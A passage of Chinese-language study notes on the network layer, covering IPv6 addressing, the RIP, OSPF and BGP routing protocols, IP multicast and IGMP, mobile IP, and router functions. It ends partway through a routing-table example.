<p>IPv4 地址通常使用点分十进制表示法。如果 IPv6 也使用这种表示法，那么地址书写起来将会相当长。在 IPv6 标准中指定了一种比较紧凑的表示法，即把地址中的每 <code>4</code> 位用一个十六进制数表示，并用冒号分隔每 <code>16</code> 位，如：<code>4BF5:AA12:0216:FEBC:BA5F:039A:BE9A:2170</code>。</p>
<p>通常可以把 IPv6 地址缩写成更紧凑的形式。当 <code>16</code> 位域的开头有一些 <code>0</code> 时，可以采用一种缩写表示法，但在域中必须至少有一个数字。例如：可以把地址 <code>4BF5:0000:0000:0000:BA5F:039A:000A:2176</code> 缩写为 <code>4BF5:0:0:0:BA5F:39A:A:2176</code>。</p>
<p>当有相继的 <code>0</code> 值域时，还可以进一步缩写。这些域可以用双冒号缩写 <code>::</code>。当然，双冒号表示法在一个地址中仅能出现一次，因为 <code>0</code> 值域的个数没有编码，需要从指定的总的域的个数来推算。这样一来，前述地址可被更紧凑地书写成 <code>4BF5::BA5F:39A:A:2176</code>。</p>
<p>IPv6 扩展了 IPv4 地址的分级概念，它使用以下三个等级：</p>
<ul>
<li><strong>第一级（顶级）</strong>：指明全球都知道的公共拓扑</li>
<li><strong>第二级（场点级）</strong>：指明单个场点</li>
<li><strong>第三级</strong>：指明单个网络接口</li>
</ul>
<p>IPv6 地址采用多级体系主要是为了使路由器能够更快地查找路由。</p>
<p>从 IPv4 向 IPv6 过渡只能采用逐步演进的办法，同时还必须使新安装的 IPv6 系统能够向后兼容。IPv6 系统必须能够接收和转发 IPv4 分组，并且能够为 IPv4 分组选择路由。</p>
<p>从 IPv4 向 IPv6 过渡可以采用双协议栈和隧道技术两种策略：<strong>双协议栈</strong> 是指在一台设备上同时装有 IPv4 和 IPv6 协议栈，那么这台设备既能和 IPv4 网络通信，又能和 IPv6 网络通信。如果这台设备是一个路由器，那么在路由器的不同接口上分别配置了 IPv4 地址和 IPv6 地址，并很可能分别连接了 IPv4 网络和 IPv6 网络；如果这台设备是一台计算机，那么它将同时拥有 IPv4 地址和 IPv6 地址，并具备同时处理这两个协议地址的功能。<strong>隧道技术</strong> 的要点是在 IPv6 数据报要进入 IPv4 网络时，把整个 IPv6 数据报封装到 IPv4 数据报的数据部分，使得 IPv6 数据报就好像在 IPv4 网络的隧道中传输。</p>
<h3> 路由协议</h3>
<h4> 自治系统</h4>
<p><strong>自治系统（Autonomous System，AS）</strong>：单一技术管理下的一组路由器，这些路由器使用一种 AS 内部的路由选择协议和共同的度量来确定分组在该 AS 内的路由，同时还使用一种 AS 之间的路由选择协议来确定分组在 AS 之间的路由。</p>
<p>一个自治系统内的所有网络都由一个行政单位（如：一家公司、一所大学、一个政府部门等）管辖，一个自治系统的所有路由器在本自治系统内都必须是连通的。</p>
<h4> 域内路由与域间路由</h4>
<p>自治系统内部的路由选择称为 <strong>域内路由</strong> 选择，自治系统之间的路由选择称为 <strong>域间路由</strong> 选择。因特网有两大类路由选择协议：</p>
<ol>
<li>
<p><strong>内部网关协议（Interior Gateway Protocol，IGP）</strong></p>
<p>内部网关协议即在一个自治系统内部使用的路由选择协议，它与互联网中其他自治系统选用什么路由选择协议无关。目前这类路由选择协议使用的最多，如：RIP 和 OSPF。</p>
</li>
<li>
<p><strong>外部网关协议（External Gateway Protocol，EGP）</strong></p>
<p>若源站和目的站处在不同的自治系统中，当数据报传到一个自治系统的边界时（两个自治系统可能使用不同的 IGP），就需要使用一种协议将路由选择信息传递到另一个自治系统中。这样的协议就是外部网关协议（EGP）。目前使用最多的外部网关协议是 BGP-4。</p>
<p>例如：有两个自治系统互连，每个自治系统自己决定在本自治系统内部运行哪个内部路由选择协议（自治系统 A 使用 RIP，自治系统 B 使用 OSPF），但每个自治系统都有一个或多个路由器（R1 和 R2）。除运行本系统的内部路由选择协议外，还要运行自治系统间的路由选择协议（如：BGP-4）。</p>
</li>
</ol>
<h4> 路由信息协议（RIP）</h4>
<p><strong>路由信息协议（Routing Information Protocol，RIP）</strong> 是内部网关协议（IGP）中最先得到广泛应用的协议。RIP 是一种分布式的基于距离向量的路由选择协议，其最大优点就是简单。</p>
<ol>
<li>
<p><strong>RIP 规定</strong></p>
<ul>
<li>网络中的每个路由器都要维护从它自身到其他每个目的网络的距离记录（因此这是一组距离，称为 <strong>距离向量</strong>）</li>
<li>距离也称跳数（HopCount），规定从一个路由器到直接连接网络的距离（跳数）为 <code>1</code>。而每经过一个路由器，距离（跳数）加 <code>1</code></li>
<li>RIP 认为好的路由就是它通过的路由器的数目少，即优先选择跳数少的路径</li>
<li>RIP 允许一条路径最多只能包含 <code>15</code> 个路由器（即最多允许 <code>15</code> 跳）。因此距离等于 <code>16</code> 时，它表示网络不可达。可见 RIP 只适用于小型互联网。距离向量路由可能会出现环路的情况，规定路径上的最高跳数的目的是为了防止数据报不断循环在环路上，减少网络拥塞的可能性</li>
<li>RIP 默认在任意两个使用 RIP 的路由器之间每 <code>30</code> 秒广播一次 RIP 路由更新信息，以便自动建立并维护路由表（动态维护）</li>
<li>在 RIP 中不支持子网掩码的 RIP 广播，所以 RIP 中每个网络的子网掩码必须相同。但在新的 RIP2 中，支持变长子网掩码和 CIDR</li>
</ul>
</li>
<li>
<p><strong>RIP 的特点</strong></p>
<ul>
<li>仅和相邻路由器交换信息</li>
<li>路由器交换的信息是当前路由器所知道的全部信息，即自已的路由表</li>
<li>按固定的时间间隔交换路由信息，如每隔 30 秒</li>
</ul>
<p>RIP 通过距离向量算法来完成路由表的更新。最初，每个路由器只知道与自已直接相连的网络。通过每 <code>30</code> 秒的 RIP 广播，相邻两个路由器相互将自己的路由表发给对方。于是经过第一次 RIP 广播，每个路由器就知道了与自己相邻的路由器的路由表（即知道了距离自己跳数为 <code>1</code> 的网络的路由）。同理，经过第二次 RIP 广播，每个路由器就知道了距离自己跳数为 <code>2</code> 的网络的路由…… 因此，经过若干 RIP 广播后，所有路由器都最终知道了整个 IP 网络的路由表，称为 RIP 最终是收敛的。通过 RIP 收敛后，每个路由器到每个目标网络的路由都是距离最短的（即跳数最少，最短路由），哪怕还存在另一条高速（低时延）但路由器较多的路由。</p>
</li>
<li>
<p><strong>距离向量算法</strong></p>
<p>每个路由表项目都有三个关键数据：{目的网络 <code>N</code>, 距离 <code>d</code>, 下一跳路由器地址 <code>X</code>}。对于 <strong>每个相邻路由器发送过来的 RIP 报文，执行如下步骤：</strong></p>
<ul>
<li>
<p>对地址为 <code>X</code> 的相邻路由器发来的 RIP 报文，先修改此报文中的所有项目：把 “下一跳” 字段中的地址都改为 <code>X</code>，并把所有 “距离” 字段的值加 <code>1</code></p>
</li>
<li>
<p>对修改后的 RIP 报文中的每个项目，执行如下步骤：</p>
<ul>
<li>当原来的路由表中没有目的网络 <code>N</code> 时，把该项目添加到路由表中</li>
<li>当原来的路由表中有目的网络 <code>N</code>，且下一跳路由器的地址是 <code>X</code> 时，用收到的项目替换原路由表中的项目</li>
<li>当原来的路由表中有目的网络 <code>N</code>，且下一跳路由器的地址不是 <code>X</code> 时，如果收到的项目中的距离 <code>d</code> 小于路由表中的距离，那么就用收到的项目替换原路由表中的项目；否则什么也不做</li>
</ul>
</li>
<li>
<p>如果 <code>180</code> 秒（RIP 默认超时时间为 <code>180</code> 秒）还没有收到相邻路由器的更新路由表，那么把此相邻路由器记为不可达路由器，即把距离设置为 <code>16</code>（距离为 <code>16</code> 表示不可达）</p>
</li>
<li>
<p>返回</p>
</li>
</ul>
<p>RIP 最大的 <strong>优点</strong> 是实现简单、开销小、收敛过程较快。<strong>RIP 的缺点如下：</strong></p>
<ul>
<li>RIP 限制了网络的规模，它能使用的最大距离为 <code>15</code>（<code>16</code> 表示不可达）</li>
<li>路由器之间交换的是路由器中的完整路由表，因此网络规模越大，开销也越大</li>
<li>网络出现故障时，会出现慢收敛现象（即需要较长时间才能将此信息传送到所有路由器），俗称 “坏消息传得慢”，使更新过程的收敛时间长</li>
</ul>
<p>RIP 是应用层协议，它使用 UDP 传送数据（端口 <code>520</code>）。RIP 选择的路径不一定是时间最短的，但一定是具有最少路由器的路径。因为它是根据最少跳数进行路径选择的。</p>
</li>
</ol>
<h4> 开放最短路径优先（OSPF）协议</h4>
<ol>
<li>
<p><strong>OSPF 协议的基本特点</strong></p>
<p>开放最短路径优先（OSPF）协议是使用分布式链路状态路由算法的典型代表，也是内部网关协议（IGP）的一种。<strong>OSPF 与 RIP 相比有以下四点主要区别：</strong></p>
<ul>
<li>OSPF 向本自治系统中的所有路由器发送信息，这里使用的方法是洪泛法。而 RIP 仅向自己相邻的几个路由器发送信息</li>
<li>发送的信息是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。“链路状态” 说明本路由器和哪些路由器相邻及该链路的 “度量”（或代价）。而在 RIP 中，发送的信息是本路由器所知道的全部信息，即整个路由表</li>
<li>只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息，并且更新过程收敛得快，不会出现 RIP “坏消息传得慢” 的问题。而在 RIP 中，不管网络拓扑是否发生变化，路由器之间都会定期交换路由表的信息</li>
<li>OSPF 是网络层协议，它不使用 UDP 或 TCP，而直接用 IP 数据报传送（其 IP 数据报首，险部的协议字段为 <code>89</code>）。而 RIP 是应用层协议；它在传输层使用 UDP</li>
</ul>
<p><strong>除以上区别外，OSPF 还有以下特点：</strong></p>
<ul>
<li>OSPF 对不同的链路可根据 IP 分组的不同服务类型（TOS）而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由，十分灵活</li>
<li>如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这称为多路径间的负载平衡</li>
<li>所有在 OSPF 路由器之间交换的分组都具有鉴别功能，因而保证了仅在可信赖的路由器之间交换链路状态信息</li>
<li>支持可变长度的子网划分和无分类编址 CIDR</li>
<li>每个链路状态都带上一个 <code>32</code> 位的序号，序号越大，状态就越新</li>
</ul>
</li>
<li>
<p><strong>OSPF 的基本工作原理</strong></p>
<p>由于各路由器之间频繁地交换链路状态信息，因此所有路由器最终都能建立一个链路状态数据库。这个数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（称为链路状态数据库的同步）。然后，每个路由器根据这个全网拓扑结构图，使用 <code>Dijkstra</code> 最短路径算法计算从自己到各目的网络的最优路径，以此构造自己的路由表。此后，当链路状态发生变化时，每个路由器重新计算到各目的网络的最优路径，构造新的路由表。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>虽然使用 <code>Dijkstra</code> 算法能计算出完整的最优路径，但路由表中不会存储完整路径，而只存储 “下一跳”（只有到了下一跳路由器，才能知道再下一跳应当怎样走）</p>
</div>
<p>为使 OSPF 能够用于规模很大的网络，OSPF 将一个自治系统再划分为若干更小的范围，称为 <strong>区域</strong>。划分区域的好处是，将利用洪泛法交换链路状态信息的范围局限于每个区域而非整个自治系统，减少了整个网络上的通信量。在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑情况。这些区域也有层次之分。处在上层的域称为 <strong>主干区域</strong>，负责连通其他下层的区域，并且还连接其他自治域。</p>
</li>
<li>
<p><strong>OSPF 的五种分组类型</strong></p>
<p>OSPF 共有以下五种分组类型：</p>
<ul>
<li>问候分组，用来发现和维持邻站的可达性</li>
<li>数据库描述分组，向邻站给出自己的链路状态数据库中的所有链路状态项目的摘要信息</li>
<li>链路状态请求分组，向对方请求发送某些链路状态项目的详细信息</li>
<li>链路状态更新分组，用洪泛法对全网更新链路状态</li>
<li>链路状态确认分组，对链路更新分组的确认</li>
</ul>
<p>通常每隔 <code>10</code> 秒，每两个相邻路由器要交换一次问候分组，以便知道哪些站可达。在路由器刚开始工作时，OSPF 让每个路由器使用数据库描述分组和相邻路由器交换本数据库中已有的链路状态摘要信息。然后，路由器使用链路状态请求分组，向对方请求发送自己所缺少的某些链路状态项目的详细信息。经过一系列的这种分组交换，就建立了全网同步的链路数据库。</p>
<p>在网络运行的过程中，只要一个路由器的链路状态发生变化，该路由器就要使用链路状态更新分组，用洪泛法向全网更新链路状态。其他路由器在更新后，发送链路状态确认分组对更新分组进行确认。</p>
<p>为了确保链路状态数据库与全网的状态保持一致，OSPF 还规定每隔一段时间（如 <code>30</code> 分钟）就刷新一次数据库中的链路状态。由于一个路由器的链路状态只涉及与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此，当互联网规模很大时，OSPF 要比 RIP 好得多，而且 OSPF 协议没有 “坏消息传播得慢” 的问题。</p>
<div class="hint-container tip">
<p class="hint-container-title">UDP 传送和 IP 数据报传送区别</p>
<p>OSPF 协议不使用 UDP 数据报传送，而是直接使用 IP 数据报传送。用 UDP 传送是指将该信息作为 UDP 报文的数据部分，而直接使用 IP 数据报传送是指将该信息直接作为 IP 数据报的数据部分。RIP 报文是作为 UDP 数据报的数据部分</p>
</div>
</li>
</ol>
<h4> 边界网关协议（BGP）</h4>
<p><strong>边界网关协议（Border Gateway Protocol，BGP）</strong> 是不同自治系统的路由器之间交换路由信息的协议，是一种外部网关协议。边界网关协议常用于互联网的网关之间。</p>
<p>内部网关协议主要设法使数据报在一个 AS 中尽可能有效地从源站传送到目的站。在一个 AS 内部不需要考虑其他方面的策略。然而 BGP 使用的环境却不同，主要原因如下：</p>
<ul>
<li>因特网的规模太大，使得自治系统之间路由选择非常困难</li>
<li>对于自治系统之间的路由选择，要寻找最佳路由是很不现实的</li>
<li>自治系统之间的路由选择必须考虑有关策略</li>
</ul>
<p>边界网关协议（BGP）只能力求寻找一条能够到达目的网络且比较好的路由（不能兜圈子），而并非寻找一条最佳路由。BGP 采用的是路径向量路由选择协议，它与距离向量协议和链路状态协议有很大的区别。BGP 是应用层协议，它是基于 TCP 的。</p>
<p><strong>BGP 的工作原理</strong>：每个自治系统的管理员要选择至少一个路由器（可以有多个）作为该自治系统的 “BGP 发言人”。一个 BGP 发言人与其他自治系统中的 BGP 发言人要交换路由信息，就要先建立 TCP 连接（可见 BGP 报文是通过 TCP 传送的，也就是说 BGP 报文是 TCP 报文的数据部分），然后在此连接上交换 BGP 报文以建立 BGP 会话，再利用 BGP 会话交换路由信息。当所有 BGP 发言人都相互交换网络可达性的信息后，各 BGP 发言人就可找出到达各个自治系统的较好路由。</p>
<p>每个 BGP 发言人除必须运行 BGP 外，还必须运行该 AS 所用的内部网关协议，如：OSPF 或 RIP。BGP 所交换的网络可达性信息就是要到达某个网络（用网络前缀表示）所要经过的一系列 AS。</p>
<p><strong>BGP 的特点如下：</strong></p>
<ul>
<li>BGP 交换路由信息的结点数量级是自治系统的数量级，比这些自治系统中的网络数少很多</li>
<li>每个自治系统中 BGP 发言人（或边界路由器）的数目是很少的。这样就使得自治系统之间的路由选择不致过分复杂</li>
<li>BGP 支持 CIDR，因此 BGP 的路由表也就应当包括目的网络前缀、下一跳路由器，以及到达该目的网络所要经过的各个自治系统序列</li>
<li>在 BGP 刚运行时，BGP 的邻站交换整个 BGP 路由表，但以后只需在发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处</li>
</ul>
<p><strong>BGP-4 共使用四种报文：</strong></p>
<ul>
<li><strong>打开（Open）报文</strong>：用来与相邻的另一个 BGP 发言人建立关系</li>
<li><strong>更新（Update）报文</strong>：用来发送某一路由的信息，以及列出要撤销的多条路由</li>
<li><strong>保活（Keepalive）报文</strong>：用来确认打开报文并周期性地证实邻站关系</li>
<li><strong>通知（Notification）报文</strong>：用来发送检测到的差错</li>
</ul>
<p><strong>RIP、OSPF 与 BGP 的比较如下表：</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">协议</th>
<th style="text-align:center">RIP</th>
<th style="text-align:center">OSPF</th>
<th style="text-align:center">BGP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">类型</td>
<td style="text-align:center">内部</td>
<td style="text-align:center">内部</td>
<td style="text-align:center">外部</td>
</tr>
<tr>
<td style="text-align:center">路由算法</td>
<td style="text-align:center">距离-向量</td>
<td style="text-align:center">链路状态</td>
<td style="text-align:center">路径-向量</td>
</tr>
<tr>
<td style="text-align:center">传递协议</td>
<td style="text-align:center">UDP</td>
<td style="text-align:center">IP</td>
<td style="text-align:center">TCP</td>
</tr>
<tr>
<td style="text-align:center">路径选择</td>
<td style="text-align:center">跳数最少</td>
<td style="text-align:center">代价最低</td>
<td style="text-align:center">较好，非最佳</td>
</tr>
<tr>
<td style="text-align:center">交换结点</td>
<td style="text-align:center">和本结点相邻的路由器</td>
<td style="text-align:center">网络中的所有路由器</td>
<td style="text-align:center">和本结点相邻的路由器</td>
</tr>
<tr>
<td style="text-align:center">交换内容</td>
<td style="text-align:center">当前本路由器知道的全部信息，即自已的路由表</td>
<td style="text-align:center">与本路由器相邻的所有路由器的链路状态</td>
<td style="text-align:center">首次：整个路由表；非首次：有变化的部分</td>
</tr>
</tbody>
</table>
<h3> IP 组播</h3>
<h4> 组播的概念</h4>
<p>为了能够支持像视频点播和视频会议这样的多媒体应用，网络必须实施某种有效的组播机制。使用多个单播传送来仿真组播总是可能的，但这会引起主机上大量的处理开销和网络上太多的交通量。然而所需要的组播机制是让源计算机一次发送的单个分组可以抵达用一个组地址标识的若干目标主机，并被它们正确接收。</p>
<p>组播一定仅应用于 UDP，它对将报文同时送往多个接收者的应用来说非常重要。而 TCP 是一个面向连接的协议，它意味着分别运行于两台主机（由 IP 地址来确定）内的两个进程（由端口号来确定）之间存在一条连接，因此会一对一地发送。</p>
<p>使用组播的缘由是，有的应用程序要把一个分组发送给多个目的地主机。不是让源主机给每个目的地主机都发送一个单独的分组，而是让源主机把单个分组发送给一个组播地址，该组播地址标识一组地址。网络（如：因特网）把这个分组的副本投递给该组中的每台主机。主机可以选择加入或离开一个组，因此一台主机可以同时属于多个组。</p>
<p>因特网中的 IP 组播也使用组播组的概念，每个组都有一个特别分配的地址，要给该组发送的计算机将使用这个地址作为分组的目标地址。在 IPv4 中，这些地址在 <code>D</code> 类地址空间中分配，而 IPv6 也有一部分地址空间保留给组播组。</p>
<p>主机使用一个称为 IGMP（因特网组管理协议）的协议加入组播组。它们使用该协议通知本地网络上的路由器关于要接收发送给某个组播组的分组的愿望。通过扩展路由器的路由选择和转发功能，可以在许多路由器互连的支持硬件组播的网络上面实现因特网组播。</p>
<p>需要注意的是，主机组播时仅发送一份数据，只有数据在传送路径出现分岔时才将分组复制后继续转发。因此，对发送者而言，数据只需发送一次就可发送到所有接收者，大大减轻了网络的负载和发送者的负担。组播需要路由器的支持才能实现，能够运行组播协议的路由器称为 <strong>组播路由器。</strong></p>
<h4> IP 组播地址</h4>
<p>IP 组播使用 <code>D</code> 类地址格式。<code>D</code> 类地址的前四位是 <code>1110</code>，因此 <code>D</code> 类地址范围是 <code>224.0.0.0~239.255.255.255</code>。每个 <code>D</code> 类 IP 地址标志一个组播组。</p>
<p><strong>组播数据报和一般的 IP 数据报的区别是</strong>，前者使用 <code>D</code> 类 IP 地址作为目的地址，并且首部中的协议字段值是 <code>2</code>，表明使用 IGMP。需要注意的是：</p>
<ul>
<li>组播数据报也是 “尽最大努力交付”，不提供可靠交付</li>
<li>组播地址只能用于目的地址，而不能用于源地址</li>
<li>对组播数据报不产生 ICMP 差错报文。因此，若在 PING 命令后面键入组播地址，将永远不会收到响应</li>
<li>并非所有的 <code>D</code> 类地址都可作为组播地址</li>
</ul>
<p>IP 组播可以分为两种：一种只在本局域网上进行硬件组播；另一种则在因特网的范围内进行组播。在因特网上进行组播的最后阶段，还是要把组播数据报在局域网上用硬件组播交付给组播组的所有成员。下面讨论这种硬件组播。</p>
<p>IANA 拥有的以太网组播地址的范围是从 <code>01-00-5E-00-00-00</code> 到 <code>01-00-5E-7F-FF-FF</code>。不难看出，在每个地址中，只有 <code>23</code> 位可用作组播。这只能和 <code>D</code> 类 IP 地址中的 <code>23</code> 位有一一对应关系。<code>D</code> 类 IP 地址可供分配的有 <code>28</code> 位，可见在这 <code>28</code> 位中，前 <code>5</code> 位不能用来构成以太网的硬件地址。</p>
<p>例如：IP 组播地址 <code>224.128.64.32</code>（即 <code>E0-80-40-20</code>）和另一个 IP 组播地址 <code>224.0.64.32</code>（即 <code>E0-00-40-20</code>）转换成以太网的硬件组播地址都是 <code>01-00-5E-00-40-20</code>。由于组播 IP 地址与以太网硬件地址的映射关系不是唯一的，因此收到组播数据报的主机，还要在 IP 层利用软件进行过滤，把不是本主机要接收的数据报丢弃。</p>
<h4> IGMP 与组播路由算法</h4>
<p>要使路由器知道组播组成员的信息，需要利用 <strong>因特网组管理协议（Internet Group Management Protocol，IGMP）</strong>。连接到局域网上的组播路由器还必须和因特网上的其他组播路由器协同工作，以便把组播数据报用最小代价传送给所有组成员，这就需要使用组播路由选择协议。</p>
<p>IGMP 并不是在因特网范围内对所有组播组成员进行管理的协议。IGMP 不知道 IP 组播组包含的成员数，也不知道这些成员分布在哪些网络上。IGMP 让连接到本地局域网上的组播路由器知道本局域网上是否有主机参加或退出了某个组播组。</p>
<p>IGMP 应视为网际协议 IP 的一个组成部分，其工作可分为两个阶段。</p>
<p>第一阶段：当某台主机加入新的组播组时，该主机应向组播组的组播地址发送一个 IGMP 报文，声明自己要成为该组的成员。本地的组播路由器收到 IGMP 报文后，将组成员关系转发给因特网上的其他组播路由器。</p>
<p>第二阶段：因为组成员关系是动态的，本地组播路由器要周期性地探询本地局域网上的主机，以便知道这些主机是否仍继续是组的成员。只要对某个组有一台主机响应，那么组播路由器就认为这个组是活跃的。但一个组在经过几次的探询后仍然没有一台主机响应时，则不再将该组的成员关系转发给其他的组播路由器。</p>
<p>组播路由选择实际上就是要找出以源主机为根结点的组播转发树，其中每个分组在每条链路上只传送一次（即在组播转发树上的路由器不会收到重复的组播数据报）。不同的多播组对应于不同的多播转发树；同一个多播组，对不同的源点也会有不同的多播转发树。</p>
<p>在许多由路由器互连的支持硬件多点传送的网络上实现因特网组播时，主要有三种路由算法：第一种是基于链路状态的路由选择；第二种是基于距离-向量的路由选择；第三种可以建立在任何路由器协议之上，因此称为协议无关的组播（PIM）。</p>
<h3> 移动 IP</h3>
<h4> 移动 IP 的概念</h4>
<p>移动 IP 技术是指移动站以固定的网络 IP 地址实现跨越不同网段的漫游功能，并保证基于网络 IP 的网络权限在漫游过程中不发生任何改变。移动 IP 的目标是把分组自动地投递给移动站。一个移动站是把其连接点从一个网络或子网改变到另一个网络或子网的主机。</p>
<p><strong>移动 IP 定义了三种功能实体</strong>：移动节点、本地代理（也称归属代理）和外地代理。</p>
<ul>
<li><strong>移动节点</strong>：具有永久 IP 地址的移动站</li>
<li><strong>本地代理</strong>：通常就是连接在归属网络（原始连接到的网络）上的路由器</li>
<li><strong>外地代理</strong>：通常就是连接在被访网络（移动到另一地点所接入的网络）上的路由器</li>
</ul>
<p>值得注意的是，某用户将笔记本关机后从家里带到办公室重新上网，在办公室能很方便地通过 DHCP 自动获取新的 IP 地址。虽然笔记本移动了，更换了地点及所接入的网络，但这并不是移动 IP。但如果需要在移动中进行 TCP 传输，在移动站漫游时，应一直保持这个 TCP 连接，否则移动站的 TCP 连接就会断断续续的。可见，若要使移动站在移动中的 TCP 连接不中断，就必须使笔记本的 IP 地址在移动中保持不变。这就是移动 IP 要研究的问题。</p>
<h4> 移动 IP 通信过程</h4>
<p>用一个通俗的例子来描述移动 IP 的通信原理。例如：在以前科技不那么发达的年代，本科毕业时都将走向各自的工作岗位。由于事先并不知道自己未来的准确通讯地址，那么怎样继续和同学们保持联系呢？实际上也很简单。彼此留下各自的家庭地址（即永久地址）。毕业后若要和某同学联系，只要写信寄到该同学的永久地址，再请其家长把信件转交即可。</p>
<p>在移动 IP 中，每个移动站都有一个原始地址，即永久地址（或归属地址），移动站原始连接的网络称为归属网络。永久地址和归属网络的关联是不变的。归属代理通常是连接到归属网络上的路由器，然而它实现的代理功能是在应用层完成的。当移动站移动到另一地点，所接入的外地网络也称被访网络。被访网络中使用的代理称为外地代理，它通常是连接在被访网络上的路由器。</p>
<p><strong>外地代理有两个重要功能</strong>：</p>
<ul>
<li>要为移动站创建一个临时地址，称为转交地址。转交地址的网络号显然和被访网络一致</li>
<li>及时把移动站的转交地址告诉其归属代理</li>
</ul>
<p><strong>移动 IP 技术的基本通信流程如下：</strong></p>
<ol>
<li>移动站在归属网络时，按传统的 TCP/IP 方式进行通信</li>
<li>移动站漫游到外地网络时，向外地代理进行登记，以获得一个临时的转交地址。外地代理要向移动站的归属代理登记移动站的转交地址</li>
<li>归属代理知道移动站的转交地址后，会构建一条通向转交地址的隧道，将截获的发送给移动站的 IP 分组进行再封装，并通过隧道发送给被访网络的外地代理</li>
<li>外地代理把收到的封装的数据报进行拆封，恢复成原始的 IP 分组，然后发送给移动站，这样移动站在被访网络就能收到这些发送给它的 IP 分组</li>
<li>移动站在被访网络对外发送数据报时，仍然使用自己的永久地址作为数据报的源地址，此时显然无须通过 A 的归属代理来转发，而是直接通过被访网络的外部代理</li>
<li>移动站移动到另一外地网络时，在新外地代理登记后，然后新外地代理将移动站的新转交地址告诉其归属代理。无论如何移动，移动站收到的数据报都是由归属代理转发的</li>
<li>移动站回到归属网络时，移动站向归属代理注销转交地址</li>
</ol>
<p><strong>注意两点</strong>：转交地址是供移动站、归属代理及外地代理使用的，各种应用程序都不会使用。外地代理要向连接在被访网络上的移动站发送数据报时，直接使用移动站的 MAC 地址。</p>
<h3> 网络层设备</h3>
<h4> 冲突域和广播域</h4>
<p>这里的 “域” 表示冲突或广播在其中发生并传播的区域。</p>
<ol>
<li>
<p><strong>冲突域</strong></p>
<p>冲突域是指连接到同一物理介质上的所有结点的集合，这些结点之间存在介质争用的现象。在 OSI 参考模型中，冲突域被视为第 <code>1</code> 层概念，像集线器、中继器等简单无脑复制转发信号的第 <code>1</code> 层设备所连接的结点都属于同一个冲突域，也就是说它们不能划分冲突域。而第 <code>2</code> 层（网桥、交换机）、第 <code>3</code> 层（路由器）设备都可以划分冲突域。</p>
</li>
<li>
<p><strong>广播域</strong></p>
<p>广播域是指接收同样广播消息的结点集合。也就是说，在该集合中的任何一个结点发送一个广播帧，其他能收到这个帧的结点都被认为是该广播域的一部分。在 OSI 参考模型中，广播域被视为第 <code>2</code> 层概念，像第 <code>1</code> 层（集线器等）、第 <code>2</code> 层（交换机等）设备所连接的结点都属于同一个广播域。而路由器，作为第 <code>3</code> 层设备，则可以划分广播域，即可以连接不同的广播域。</p>
<p>通常所说的局域网（LAN）特指使用路由器分割的网络，也就是广播域。</p>
</li>
</ol>
<h4> 路由器的组成和功能</h4>
<p>路由器是一种具有多个输入/输出端口的专用计算机，其任务是连接不同的网络（连接异构网络）并完成路由转发。在多个逻辑网络（即多个广播域）互连时必须使用路由器。</p>
<p>当源主机要向目标主机发送数据报时，路由器先检查源主机与目标主机是否连接在同一个网络上。如果源主机和目标主机在同一个网络上，那么直接交付而无须通过路由器。如果源主机和目标主机不在同一个网络上，那么路由器按照转发表（路由表）指出的路由将数据报转发给下一个路由器，这称为 <strong>间接交付</strong>。可见，在同一个网络中传递数据无须路由器的参与，而跨网络通信必须通过路由器进行转发。例如：路由器可以连接不同的 LAN，连接不同的VLAN，连接不同的 WAN，或者把 LAN 和 WAN 互连起来。路由器隔离了广播域。</p>
<p>从结构上看，路由器由路由选择和分组转发两部分构成。而从模型的角度看，路由器是网络层设备，它实现了网络模型的下三层，即物理层、数据链路层和网络层。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果一个存储转发设备实现了某个层次的功能，那么它就可以互连两个在该层次上使用不同协议的网段（网络）。如：网桥实现了物理层和数据链路层，那么网桥可以互连两个物理层和数据链路层不同的网段；但中继器实现了物理层后，却不能互连两个物理层不同的网段，这是因为中继器不是存储转发设备，它属于直通式设备</p>
</div>
<p>路由选择部分也称控制部分，其核心构件是路由选择处理机。路由选择处理机的任务是根据所选定的路由选择协议构造出路由表，同时经常或定期地和相邻路由器交换路由信息而不断更新和维护路由表。</p>
<p><strong>分组转发部分由三部分组成</strong>：交换结构、一组输入端口和一组输出端口。输入端口在从物理层接收到的比特流中提取出数据链路层帧，进而从帧中提取出网络层数据报，输出端口则执行恰好相反的操作。交换结构是路由器的关键部件，它根据转发表对分组进行处理，将某个输入端口进入的分组从一个合适的输出端口转发出去。有 <strong>三种常用的交换方法</strong>：通过存储器进行交换、通过总线进行交换和通过互联网络进行交换。交换结构本身就是一个网络。</p>
<p><strong>路由器主要完成两个功能</strong>：一是分组转发，二是路由计算。前者处理通过路由器的数据流，关键操作是转发表查询、转发及相关的队列管理和任务调度等；后者通过和其他路由器进行基于路由协议的交互，完成路由表的计算。</p>
<p><strong>路由器和网桥的重要区别是</strong>：网桥与高层协议无关，而路由器是面向协议的，它依据网络地址进行操作，并进行路径选择、分段、帧格式转换、对数据报的生存时间和流量进行控制等。现今的路由器一般都提供多种协议的支持，包括 OSI、TCP/IP、IPX 等。</p>
<h4> 路由表与路由转发</h4>
<p>路由表是根据路由选择算法得出的，主要用途是路由选择。<strong>标准的路由表有四个项目</strong>：目的网络 IP 地址、子网掩码、下一跳 IP 地址、接口。一个路由表如下表所示，该路由表包含到互联网的默认路由。</p>
<table>
<thead>
<tr>
<th style="text-align:center">目的网络 IP 地址</th>
<th style="text-align:center">子网掩</th>
<th style="text-align:center">下一跳 IP 地址</th>
<th style="text-align:center">接口</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">202.114.1.0</td>
<td style="text-align:center">255.255.255.0</td>
<td style="text-align:center">Direct</td>
<td style="text-align:center">E1</td>
</tr>
<tr>
<td style="text-align:center">202.114.2.0</td>
<td style="text-align:center">255.255.255.0</td>
<td style="text-align:center">Direct</td>
<td style="text-align:center">L0</td>
</tr>
<tr>
<td style="text-align:center">202.114.3.0</td>
<td style="text-align:center">255.255.255.0</td>
<td style="text-align:center">202.114.2.2</td>
<td style="text-align:center">L0</td>
